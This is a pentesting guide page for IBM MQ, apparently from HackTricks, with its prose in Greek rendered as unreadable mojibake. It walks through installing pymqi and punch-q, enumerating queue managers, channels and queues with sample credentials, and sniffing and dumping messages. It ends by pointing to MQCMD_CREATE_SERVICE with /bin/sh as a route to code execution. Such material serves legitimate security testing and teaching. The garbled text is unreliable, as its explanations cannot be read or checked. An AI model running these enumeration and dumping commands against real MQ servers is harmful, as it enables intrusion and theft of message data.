# 1414 - Pentesting IBM MQ

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic information

IBM MQ ÎµÎ¯Î½Î±Î¹ Î¼Î¹Î± Ï„ÎµÏ‡Î½Î¿Î»Î¿Î³Î¯Î± Ï„Î·Ï‚ IBM Î³Î¹Î± Ï„Î· Î´Î¹Î±Ï‡ÎµÎ¯ÏÎ¹ÏƒÎ· Î¿Ï…ÏÏÎ½ Î¼Î·Î½Ï…Î¼Î¬Ï„Ï‰Î½. ÎŒÏ€Ï‰Ï‚ Î¬Î»Î»ÎµÏ‚ Ï„ÎµÏ‡Î½Î¿Î»Î¿Î³Î¯ÎµÏ‚ **message broker**, ÎµÎ¯Î½Î±Î¹ Î±Ï†Î¹ÎµÏÏ‰Î¼Î­Î½Î· ÏƒÏ„Î· Î»Î®ÏˆÎ·, Î±Ï€Î¿Î¸Î®ÎºÎµÏ…ÏƒÎ·, ÎµÏ€ÎµÎ¾ÎµÏÎ³Î±ÏƒÎ¯Î± ÎºÎ±Î¹ Ï„Î±Î¾Î¹Î½ÏŒÎ¼Î·ÏƒÎ· Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¹ÏÎ½ Î¼ÎµÏ„Î±Î¾Ï Ï€Î±ÏÎ±Î³Ï‰Î³ÏÎ½ ÎºÎ±Î¹ ÎºÎ±Ï„Î±Î½Î±Î»Ï‰Ï„ÏÎ½.

Î‘Ï€ÏŒ Ï€ÏÎ¿ÎµÏ€Î¹Î»Î¿Î³Î®, **ÎµÎºÎ¸Î­Ï„ÎµÎ¹ Ï„Î·Î½ TCP Î¸ÏÏÎ± 1414 Ï„Î¿Ï… IBM MQ**. 
ÎœÎµÏÎ¹ÎºÎ­Ï‚ Ï†Î¿ÏÎ­Ï‚, Ï„Î¿ HTTP REST API Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎºÏ„ÎµÎ¸ÎµÎ¯ ÏƒÏ„Î·Î½ Î¸ÏÏÎ± **9443**. 
ÎŸÎ¹ Î¼ÎµÏ„ÏÎ®ÏƒÎµÎ¹Ï‚ (Prometheus) Î¼Ï€Î¿ÏÎ¿ÏÎ½ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î½Î± Ï€ÏÎ¿ÏƒÏ€ÎµÎ»Î±ÏƒÏ„Î¿ÏÎ½ Î±Ï€ÏŒ Ï„Î·Î½ TCP Î¸ÏÏÎ± **9157**.

Î— TCP Î¸ÏÏÎ± 1414 Ï„Î¿Ï… IBM MQ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Î³Î¹Î± Î½Î± Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„ÎµÎ¯ Î¼Î·Î½ÏÎ¼Î±Ï„Î±, Î¿Ï…ÏÎ­Ï‚, ÎºÎ±Î½Î¬Î»Î¹Î±, ... Î±Î»Î»Î¬ **ÎºÎ±Î¹ Î³Î¹Î± Î½Î± ÎµÎ»Î­Î³Î¾ÎµÎ¹ Ï„Î·Î½ instance**.

Î— IBM Ï€Î±ÏÎ­Ï‡ÎµÎ¹ ÎµÎºÏ„ÎµÎ½Î® Ï„ÎµÏ‡Î½Î¹ÎºÎ® Ï„ÎµÎºÎ¼Î·ÏÎ¯Ï‰ÏƒÎ· Î´Î¹Î±Î¸Î­ÏƒÎ¹Î¼Î· ÏƒÏ„Î¿ [https://www.ibm.com/docs/en/ibm-mq](https://www.ibm.com/docs/en/ibm-mq).

## Tools

ÎˆÎ½Î± Ï€ÏÎ¿Ï„ÎµÎ¹Î½ÏŒÎ¼ÎµÎ½Î¿ ÎµÏÎ³Î±Î»ÎµÎ¯Î¿ Î³Î¹Î± ÎµÏÎºÎ¿Î»Î· ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ· ÎµÎ¯Î½Î±Î¹ Ï„Î¿ **[punch-q](https://github.com/sensepost/punch-q)**, Î¼Îµ Ï‡ÏÎ®ÏƒÎ· Docker. Î¤Î¿ ÎµÏÎ³Î±Î»ÎµÎ¯Î¿ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ ÎµÎ½ÎµÏÎ³Î¬ Ï„Î· Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎ· Python `pymqi`.

Î“Î¹Î± Î¼Î¹Î± Ï€Î¹Î¿ Ï‡ÎµÎ¹ÏÎ¿ÎºÎ¯Î½Î·Ï„Î· Ï€ÏÎ¿ÏƒÎ­Î³Î³Î¹ÏƒÎ·, Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÏ„Îµ Ï„Î· Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎ· Python **[pymqi](https://github.com/dsuch/pymqi)**. [Î•Î¾Î±ÏÏ„Î®ÏƒÎµÎ¹Ï‚ IBM MQ](https://www.ibm.com/support/fixcentral/swg/selectFixes?parent=ibm%7EWebSphere&product=ibm/WebSphere/WebSphere+MQ&release=9.0.0.4&platform=All&function=fixId&fixids=9.0.0.4-IBM-MQC-*,9.0.0.4-IBM-MQ-Install-Java-All,9.0.0.4-IBM-MQ-Java-InstallRA&useReleaseAsTarget=true&includeSupersedes=0&source=fc) ÎµÎ¯Î½Î±Î¹ Î±Ï€Î±ÏÎ±Î¯Ï„Î·Ï„ÎµÏ‚.

### Installing pymqi

**ÎŸÎ¹ ÎµÎ¾Î±ÏÏ„Î®ÏƒÎµÎ¹Ï‚ IBM MQ** Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± ÎµÎ³ÎºÎ±Ï„Î±ÏƒÏ„Î±Î¸Î¿ÏÎ½ ÎºÎ±Î¹ Î½Î± Ï†Î¿ÏÏ„Ï‰Î¸Î¿ÏÎ½:

1. Î”Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÏ„Îµ Î­Î½Î±Î½ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ (IBMid) ÏƒÏ„Î¿ [https://login.ibm.com/](https://login.ibm.com/).
2. ÎšÎ±Ï„ÎµÎ²Î¬ÏƒÏ„Îµ Ï„Î¹Ï‚ Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎµÏ‚ IBM MQ Î±Ï€ÏŒ [https://www.ibm.com/support/fixcentral/swg/selectFixes?parent=ibm%7EWebSphere&product=ibm/WebSphere/WebSphere+MQ&release=9.0.0.4&platform=All&function=fixId&fixids=9.0.0.4-IBM-MQC-*,9.0.0.4-IBM-MQ-Install-Java-All,9.0.0.4-IBM-MQ-Java-InstallRA&useReleaseAsTarget=true&includeSupersedes=0&source=fc](https://www.ibm.com/support/fixcentral/swg/selectFixes?parent=ibm%7EWebSphere&product=ibm/WebSphere/WebSphere+MQ&release=9.0.0.4&platform=All&function=fixId&fixids=9.0.0.4-IBM-MQC-*,9.0.0.4-IBM-MQ-Install-Java-All,9.0.0.4-IBM-MQ-Java-InstallRA&useReleaseAsTarget=true&includeSupersedes=0&source=fc). Î“Î¹Î± Linux x86_64 ÎµÎ¯Î½Î±Î¹ **9.0.0.4-IBM-MQC-LinuxX64.tar.gz**.
3. Î‘Ï€Î¿ÏƒÏ…Î¼Ï€Î¹Î­ÏƒÏ„Îµ (`tar xvzf 9.0.0.4-IBM-MQC-LinuxX64.tar.gz`).
4. Î•ÎºÏ„ÎµÎ»Î­ÏƒÏ„Îµ `sudo ./mqlicense.sh` Î³Î¹Î± Î½Î± Î±Ï€Î¿Î´ÎµÏ‡Î¸ÎµÎ¯Ï„Îµ Ï„Î¿Ï…Ï‚ ÏŒÏÎ¿Ï…Ï‚ Î¬Î´ÎµÎ¹Î±Ï‚.

>Î‘Î½ Î²ÏÎ¯ÏƒÎºÎµÏƒÏ„Îµ ÏƒÎµ Kali Linux, Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î®ÏƒÏ„Îµ Ï„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ `mqlicense.sh`: Î±Ï†Î±Î¹ÏÎ­ÏƒÏ„Îµ/ÏƒÏ‡Î¿Î»Î¹Î¬ÏƒÏ„Îµ Ï„Î¹Ï‚ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ Î³ÏÎ±Î¼Î¼Î­Ï‚ (Î¼ÎµÏ„Î±Î¾Ï Î³ÏÎ±Î¼Î¼ÏÎ½ 105-110):
>
>```bash
>if [ ${BUILD_PLATFORM} != `uname`_`uname ${UNAME_FLAG}` ]
>  then
>    echo "ERROR: This package is incompatible with this system"
>    echo "       This package was built for ${BUILD_PLATFORM}"
>    exit 1
>fi
>```

5. Î•Î³ÎºÎ±Ï„Î±ÏƒÏ„Î®ÏƒÏ„Îµ Î±Ï…Ï„Î¬ Ï„Î± Ï€Î±ÎºÎ­Ï„Î±:
```bash
sudo rpm --prefix /opt/mqm -ivh --nodeps --force-debian MQSeriesRuntime-9.0.0-4.x86_64.rpm
sudo rpm --prefix /opt/mqm -ivh --nodeps --force-debian MQSeriesClient-9.0.0-4.x86_64.rpm
sudo rpm --prefix /opt/mqm -ivh --nodeps --force-debian MQSeriesSDK-9.0.0-4.x86_64.rpm
```
6. Î£Ï„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î±, Ï€ÏÎ¿ÏƒÎ¸Î­ÏƒÏ„Îµ Ï€ÏÎ¿ÏƒÏ‰ÏÎ¹Î½Î¬ Ï„Î± `.so` Î±ÏÏ‡ÎµÎ¯Î± ÏƒÏ„Î¿ LD: `export LD_LIBRARY_PATH=/opt/mqm/lib64`, **Ï€ÏÎ¹Î½** ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ Î¬Î»Î»Î± ÎµÏÎ³Î±Î»ÎµÎ¯Î± Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î¿ÏÎ½ Î±Ï…Ï„Î­Ï‚ Ï„Î¹Ï‚ ÎµÎ¾Î±ÏÏ„Î®ÏƒÎµÎ¹Ï‚.

Î£Ï„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î±, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎºÎ»Ï‰Î½Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Ï„Î¿ Î­ÏÎ³Î¿ [**pymqi**](https://github.com/dsuch/pymqi): Ï€ÎµÏÎ¹Î­Ï‡ÎµÎ¹ ÎµÎ½Î´Î¹Î±Ï†Î­ÏÎ¿Î½Ï„Î± Î±Ï€Î¿ÏƒÏ€Î¬ÏƒÎ¼Î±Ï„Î± ÎºÏÎ´Î¹ÎºÎ±, ÏƒÏ„Î±Î¸ÎµÏÎ­Ï‚, ... Î‰ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎµÎ³ÎºÎ±Ï„Î±ÏƒÏ„Î®ÏƒÎµÏ„Îµ Î±Ï€ÎµÏ…Î¸ÎµÎ¯Î±Ï‚ Ï„Î· Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎ· Î¼Îµ: `pip install pymqi`.

### Î§ÏÎ®ÏƒÎ· punch-q

#### ÎœÎµ Docker

Î‘Ï€Î»Î¬ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÏ„Îµ: `sudo docker run --rm -ti leonjza/punch-q`.

#### Î§Ï‰ÏÎ¯Ï‚ Docker

ÎšÎ»Ï‰Î½Î¿Ï€Î¿Î¹Î®ÏƒÏ„Îµ Ï„Î¿ Î­ÏÎ³Î¿ [**punch-q**](https://github.com/sensepost/punch-q) ÎºÎ±Î¹ ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ Ï„Î¿ readme Î³Î¹Î± Ï„Î·Î½ ÎµÎ³ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ· (`pip install -r requirements.txt && python3 setup.py install`).

ÎœÎµÏ„Î¬, Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Î¼Îµ Ï„Î·Î½ ÎµÎ½Ï„Î¿Î»Î® `punch-q`.

## Î‘ÏÎ¹Î¸Î¼Î·Ï„Î¹ÎºÎ®

ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï€ÏÎ¿ÏƒÏ€Î±Î¸Î®ÏƒÎµÏ„Îµ Î½Î± Î±ÏÎ¹Î¸Î¼Î®ÏƒÎµÏ„Îµ Ï„Î¿ **ÏŒÎ½Î¿Î¼Î± Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î® Î¿Ï…ÏÎ¬Ï‚, Ï„Î¿Ï…Ï‚ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚, Ï„Î± ÎºÎ±Î½Î¬Î»Î¹Î± ÎºÎ±Î¹ Ï„Î¹Ï‚ Î¿Ï…ÏÎ­Ï‚** Î¼Îµ **punch-q** Î® **pymqi**.

### Î”Î¹Î±Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î®Ï‚ ÎŸÏ…ÏÎ¬Ï‚

ÎœÎµÏÎ¹ÎºÎ­Ï‚ Ï†Î¿ÏÎ­Ï‚, Î´ÎµÎ½ Ï…Ï€Î¬ÏÏ‡ÎµÎ¹ Ï€ÏÎ¿ÏƒÏ„Î±ÏƒÎ¯Î± ÎºÎ±Ï„Î¬ Ï„Î·Ï‚ Î±Ï€ÏŒÎºÏ„Î·ÏƒÎ·Ï‚ Ï„Î¿Ï… Î¿Î½ÏŒÎ¼Î±Ï„Î¿Ï‚ Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î® Î¿Ï…ÏÎ¬Ï‚:
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 discover name
Queue Manager name: MYQUEUEMGR
```
### Channels

**punch-q** Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ Î¼Î¹Î± ÎµÏƒÏ‰Ï„ÎµÏÎ¹ÎºÎ® (Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î®ÏƒÎ¹Î¼Î·) Î»Î¯ÏƒÏ„Î± Î»Î­Î¾ÎµÏ‰Î½ Î³Î¹Î± Î½Î± Î²ÏÎµÎ¹ Ï…Ï€Î¬ÏÏ‡Î¿Î½Ï„ÎµÏ‚ ÎºÎ±Î½Î±Î»Î¹Î¿ÏÏ‚. Î Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Ï‡ÏÎ®ÏƒÎ·Ï‚:
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd discover channels
"DEV.ADMIN.SVRCONN" exists and was authorised.
"SYSTEM.AUTO.SVRCONN" might exist, but user was not authorised.
"SYSTEM.DEF.SVRCONN" might exist, but user was not authorised.
```
Î£Ï…Î¼Î²Î±Î¯Î½ÎµÎ¹ Î¼ÎµÏÎ¹ÎºÎ­Ï‚ Ï†Î¿ÏÎ­Ï‚ Î¿ÏÎ¹ÏƒÎ¼Î­Î½ÎµÏ‚ Ï€ÎµÏÎ¹Ï€Ï„ÏÏƒÎµÎ¹Ï‚ IBM MQ Î½Î± Î´Î­Ï‡Î¿Î½Ï„Î±Î¹ **Î¼Î· Î±Ï…Î¸ÎµÎ½Ï„Î¹ÎºÎ¿Ï€Î¿Î¹Î·Î¼Î­Î½Î±** Î±Î¹Ï„Î®Î¼Î±Ï„Î± MQ, Î¿Ï€ÏŒÏ„Îµ Î´ÎµÎ½ Ï‡ÏÎµÎ¹Î¬Î¶ÎµÏ„Î±Î¹ `--username / --password`. Î¦Ï…ÏƒÎ¹ÎºÎ¬, Ï„Î± Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î½Î± Î´Î¹Î±Ï†Î­ÏÎ¿Ï…Î½.

ÎœÏŒÎ»Î¹Ï‚ Î±Ï€Î¿ÎºÏ„Î®ÏƒÎ¿Ï…Î¼Îµ Î­Î½Î± ÏŒÎ½Î¿Î¼Î± ÎºÎ±Î½Î±Î»Î¹Î¿Ï (ÎµÎ´Ï: `DEV.ADMIN.SVRCONN`), Î¼Ï€Î¿ÏÎ¿ÏÎ¼Îµ Î½Î± Î±Ï€Î±ÏÎ¹Î¸Î¼Î®ÏƒÎ¿Ï…Î¼Îµ ÏŒÎ»Î± Ï„Î± Î¬Î»Î»Î± ÎºÎ±Î½Î¬Î»Î¹Î±.

Î— Î±Ï€Î±ÏÎ¯Î¸Î¼Î·ÏƒÎ· Î¼Ï€Î¿ÏÎµÎ¯ Î²Î±ÏƒÎ¹ÎºÎ¬ Î½Î± Î³Î¯Î½ÎµÎ¹ Î¼Îµ Î±Ï…Ï„ÏŒ Ï„Î¿ Î±Ï€ÏŒÏƒÏ€Î±ÏƒÎ¼Î± ÎºÏÎ´Î¹ÎºÎ± `code/examples/dis_channels.py` Î±Ï€ÏŒ **pymqi**:
```python
import logging
import pymqi

logging.basicConfig(level=logging.INFO)

queue_manager = 'MYQUEUEMGR'
channel = 'DEV.ADMIN.SVRCONN'
host = '172.17.0.2'
port = '1414'
conn_info = '%s(%s)' % (host, port)
user = 'admin'
password = 'passw0rd'

prefix = '*'

args = {pymqi.CMQCFC.MQCACH_CHANNEL_NAME: prefix}

qmgr = pymqi.connect(queue_manager, channel, conn_info, user, password)
pcf = pymqi.PCFExecute(qmgr)

try:
response = pcf.MQCMD_INQUIRE_CHANNEL(args)
except pymqi.MQMIError as e:
if e.comp == pymqi.CMQC.MQCC_FAILED and e.reason == pymqi.CMQC.MQRC_UNKNOWN_OBJECT_NAME:
logging.info('No channels matched prefix `%s`' % prefix)
else:
raise
else:
for channel_info in response:
channel_name = channel_info[pymqi.CMQCFC.MQCACH_CHANNEL_NAME]
logging.info('Found channel `%s`' % channel_name)

qmgr.disconnect()

```
... Î‘Î»Î»Î¬ Ï„Î¿ **punch-q** ÎµÎ½ÏƒÏ‰Î¼Î±Ï„ÏÎ½ÎµÎ¹ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î±Ï…Ï„ÏŒ Ï„Î¿ Î¼Î­ÏÎ¿Ï‚ (Î¼Îµ Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚!).
ÎœÏ€Î¿ÏÎµÎ¯ Î½Î± ÎµÎºÎºÎ¹Î½Î®ÏƒÎµÎ¹ Î¼Îµ:
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN show channels -p '*'
Showing channels with prefix: "*"...

| Name                 | Type              | MCA UID | Conn Name | Xmit Queue | Description     | SSL Cipher |
|----------------------|-------------------|---------|-----------|------------|-----------------|------------|
| DEV.ADMIN.SVRCONN    | Server-connection |         |           |            |                 |            |
| DEV.APP.SVRCONN      | Server-connection | app     |           |            |                 |            |
| SYSTEM.AUTO.RECEIVER | Receiver          |         |           |            | Auto-defined by |            |
| SYSTEM.AUTO.SVRCONN  | Server-connection |         |           |            | Auto-defined by |            |
| SYSTEM.DEF.AMQP      | AMQP              |         |           |            |                 |            |
| SYSTEM.DEF.CLUSRCVR  | Cluster-receiver  |         |           |            |                 |            |
| SYSTEM.DEF.CLUSSDR   | Cluster-sender    |         |           |            |                 |            |
| SYSTEM.DEF.RECEIVER  | Receiver          |         |           |            |                 |            |
| SYSTEM.DEF.REQUESTER | Requester         |         |           |            |                 |            |
| SYSTEM.DEF.SENDER    | Sender            |         |           |            |                 |            |
| SYSTEM.DEF.SERVER    | Server            |         |           |            |                 |            |
| SYSTEM.DEF.SVRCONN   | Server-connection |         |           |            |                 |            |
| SYSTEM.DEF.CLNTCONN  | Client-connection |         |           |            |                 |            |
```
### Queues

Î¥Ï€Î¬ÏÏ‡ÎµÎ¹ Î­Î½Î± Î±Ï€ÏŒÏƒÏ€Î±ÏƒÎ¼Î± ÎºÏÎ´Î¹ÎºÎ± Î¼Îµ **pymqi** (`dis_queues.py`) Î±Î»Î»Î¬ Ï„Î¿ **punch-q** ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î·Î½ Î±Î½Î¬ÎºÏ„Î·ÏƒÎ· Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÏ‰Î½ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¹ÏÎ½ ÏƒÏ‡ÎµÏ„Î¹ÎºÎ¬ Î¼Îµ Ï„Î¹Ï‚ Î¿Ï…ÏÎ­Ï‚:
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN show queues -p '*'
Showing queues with prefix: "*"...
| Created   | Name                 | Type   | Usage   | Depth  | Rmt. QM | Rmt. Qu | Description                       |
|           |                      |        |         |        | GR Name | eue Nam |                                   |
|           |                      |        |         |        |         | e       |                                   |
|-----------|----------------------|--------|---------|--------|---------|---------|-----------------------------------|
| 2023-10-1 | DEV.DEAD.LETTER.QUEU | Local  | Normal  | 0      |         |         |                                   |
| 0 18.35.1 | E                    |        |         |        |         |         |                                   |
| 9         |                      |        |         |        |         |         |                                   |
| 2023-10-1 | DEV.QUEUE.1          | Local  | Normal  | 0      |         |         |                                   |
| 0 18.35.1 |                      |        |         |        |         |         |                                   |
| 9         |                      |        |         |        |         |         |                                   |
| 2023-10-1 | DEV.QUEUE.2          | Local  | Normal  | 0      |         |         |                                   |
| 0 18.35.1 |                      |        |         |        |         |         |                                   |
| 9         |                      |        |         |        |         |         |                                   |
| 2023-10-1 | DEV.QUEUE.3          | Local  | Normal  | 0      |         |         |                                   |
| 0 18.35.1 |                      |        |         |        |         |         |                                   |
| 9         |                      |        |         |        |         |         |                                   |
# Truncated
```
## Exploit

### Dump messages

ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÏƒÏ„Î¿Ï‡ÎµÏÏƒÎµÏ„Îµ Î¿Ï…ÏÎ­Ï‚/ÎºÎ±Î½Î¬Î»Î¹Î± Î³Î¹Î± Î½Î± ÎºÎ±Ï„Î±ÏƒÎºÎ¿Ï€ÎµÏÏƒÎµÏ„Îµ/ÎµÎ¾Î¬Î³ÎµÏ„Îµ Î¼Î·Î½ÏÎ¼Î±Ï„Î± Î±Ï€ÏŒ Î±Ï…Ï„Î¬ (Î¼Î· ÎºÎ±Ï„Î±ÏƒÏ„ÏÎ¿Ï†Î¹ÎºÎ® Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î±). *Examples:*
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN messages sniff
```

```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN messages dump
```
**ÎœÎ· Î´Î¹ÏƒÏ„Î¬ÏƒÎµÏ„Îµ Î½Î± ÎµÏ€Î±Î½Î±Î»Î¬Î²ÎµÏ„Îµ ÏŒÎ»ÎµÏ‚ Ï„Î¹Ï‚ Î±Î½Î±Î³Î½Ï‰ÏÎ¹ÏƒÎ¼Î­Î½ÎµÏ‚ Î¿Ï…ÏÎ­Ï‚.**

### Î•ÎºÏ„Î­Î»ÎµÏƒÎ· ÎºÏÎ´Î¹ÎºÎ±

> ÎŸÏÎ¹ÏƒÎ¼Î­Î½ÎµÏ‚ Î»ÎµÏ€Ï„Î¿Î¼Î­ÏÎµÎ¹ÎµÏ‚ Ï€ÏÎ¹Î½ ÏƒÏ…Î½ÎµÏ‡Î¯ÏƒÎ¿Ï…Î¼Îµ: Î¤Î¿ IBM MQ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎ»ÎµÎ³Ï‡Î¸ÎµÎ¯ Î¼Î­ÏƒÏ‰ Ï€Î¿Î»Î»ÏÎ½ Ï„ÏÏŒÏ€Ï‰Î½: MQSC, PCF, Control Command. ÎŸÏÎ¹ÏƒÎ¼Î­Î½ÎµÏ‚ Î³ÎµÎ½Î¹ÎºÎ­Ï‚ Î»Î¯ÏƒÏ„ÎµÏ‚ Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Î²ÏÎµÎ¸Î¿ÏÎ½ ÏƒÏ„Î·Î½ [Ï„ÎµÎºÎ¼Î·ÏÎ¯Ï‰ÏƒÎ· Ï„Î¿Ï… IBM MQ](https://www.ibm.com/docs/en/ibm-mq/9.2?topic=reference-command-sets-comparison).
> [**PCF**](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=commands-introduction-mq-programmable-command-formats) (***Î ÏÎ¿Î³ÏÎ±Î¼Î¼Î±Ï„Î¹Î¶ÏŒÎ¼ÎµÎ½ÎµÏ‚ ÎœÎ¿ÏÏ†Î­Ï‚ Î•Î½Ï„Î¿Î»ÏÎ½***) ÎµÎ¯Î½Î±Î¹ Î±Ï…Ï„ÏŒ Ï€Î¿Ï… ÎµÏ€Î¹ÎºÎµÎ½Ï„ÏÏ‰Î½ÏŒÎ¼Î±ÏƒÏ„Îµ Î³Î¹Î± Î½Î± Î±Î»Î»Î·Î»ÎµÏ€Î¹Î´ÏÎ¬ÏƒÎ¿Ï…Î¼Îµ Î±Ï€Î¿Î¼Î±ÎºÏÏ…ÏƒÎ¼Î­Î½Î± Î¼Îµ Ï„Î·Î½ Ï€ÎµÏÎ¯Ï€Ï„Ï‰ÏƒÎ·. **punch-q** ÎºÎ±Î¹ ÎµÏ€Î¹Ï€Î»Î­Î¿Î½ **pymqi** Î²Î±ÏƒÎ¯Î¶Î¿Î½Ï„Î±Î¹ ÏƒÎµ Î±Î»Î»Î·Î»ÎµÏ€Î¹Î´ÏÎ¬ÏƒÎµÎ¹Ï‚ PCF.
>
> ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ Î¼Î¹Î± Î»Î¯ÏƒÏ„Î± Î¼Îµ Ï„Î¹Ï‚ ÎµÎ½Ï„Î¿Î»Î­Ï‚ PCF:
> * [Î‘Ï€ÏŒ Ï„Î·Î½ Ï„ÎµÎºÎ¼Î·ÏÎ¯Ï‰ÏƒÎ· PCF](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=reference-definitions-programmable-command-formats), ÎºÎ±Î¹
> * [Î±Ï€ÏŒ ÏƒÏ„Î±Î¸ÎµÏÎ­Ï‚](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=constants-mqcmd-command-codes).
>
> ÎœÎ¹Î± ÎµÎ½Î´Î¹Î±Ï†Î­ÏÎ¿Ï…ÏƒÎ± ÎµÎ½Ï„Î¿Î»Î® ÎµÎ¯Î½Î±Î¹ Î· `MQCMD_CREATE_SERVICE` ÎºÎ±Î¹ Î· Ï„ÎµÎºÎ¼Î·ÏÎ¯Ï‰ÏƒÎ® Ï„Î·Ï‚ ÎµÎ¯Î½Î±Î¹ Î´Î¹Î±Î¸Î­ÏƒÎ¹Î¼Î· [ÎµÎ´Ï](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=formats-change-copy-create-service-multiplatforms). Î”Î­Ï‡ÎµÏ„Î±Î¹ Ï‰Ï‚ ÎµÏ€Î¹Ï‡ÎµÎ¯ÏÎ·Î¼Î± Î¼Î¹Î± `StartCommand` Ï€Î¿Ï… Î´ÎµÎ¯Ï‡Î½ÎµÎ¹ ÏƒÎµ Î­Î½Î± Ï„Î¿Ï€Î¹ÎºÏŒ Ï€ÏÏŒÎ³ÏÎ±Î¼Î¼Î± ÏƒÏ„Î·Î½ Ï€ÎµÏÎ¯Ï€Ï„Ï‰ÏƒÎ· (Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±: `/bin/sh`).
>
